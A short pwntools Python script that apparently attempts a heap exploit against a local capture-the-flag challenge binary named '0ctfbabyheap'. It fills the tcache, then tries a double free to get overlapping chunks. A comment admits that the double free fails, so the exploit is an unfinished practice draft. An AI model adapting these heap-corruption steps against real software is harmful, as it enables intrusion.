#!/usr/bin/env python3
from pwn import *
TCACHE_COUNT = 7
TARGET_SIZE = 32
elf = ELF("./given/0ctfbabyheap")

def conn():
    p = process([elf.path])
    if args.D:
        gdb.debug(p)
    return p

def m(size, p):
    p.recvuntil(b"Command:")
    p.sendline(b"1")

    p.recvuntil(b"Size:")
    p.sendline(str(size).encode('ascii'))

    p.recvuntil(b"Allocate Index ")
    idx_bytes = p.recvline()
    idx = int(idx_bytes.strip())
    print("{} th object allocated".format(idx))
    return idx

def f(index, p):
    p.recvuntil(b"Command:")
    p.sendline(b"3")
    p.recvuntil(b"Index:")
    p.sendline(str(index).encode('ascii'))

def input_data(index, data, p):
    p.recvuntil(b"Command:")
    p.sendline(b"2")
    p.recvuntil(b"Index:")
    p.sendline(str(index).encode('ascii'))
    p.recvuntil(b"Size:")
    p.sendline(str(len(data)).encode('ascii'))
    p.recvuntil(b"Content:")
    p.sendline(data)

def output_data(index, p):
    p.recvuntil(b"Command:")
    p.sendline(b"4")
    p.recvuntil(b"Index:")
    p.sendline(str(index).encode('ascii'))
    p.recvuntil(b"Content")
    p.recvline()
    data = p.recvline()
    print(data)

def fill_tcache(p):
    chunk_list = []
    for _ in range(TCACHE_COUNT):
        obj = m(TARGET_SIZE, p)
        chunk_list.append(obj)
    for obj in chunk_list:
        f(obj, p)

def exploit():

    p = conn()

    fill_tcache(p)
    a = m(TARGET_SIZE, p)
    b = m(TARGET_SIZE, p)
    c = m(TARGET_SIZE, p)
    f(a, p)
    f(b, p)
    f(a, p) # this does not work becuase this elf uses metadata to check if it is freed
    x = m(TARGET_SIZE, p)
    y = m(TARGET_SIZE, p)
    z = m(TARGET_SIZE, p)

    input_data(x, b"pingjui", p)
    output_data(z, p)

if __name__ == '__main__':
    exploit()
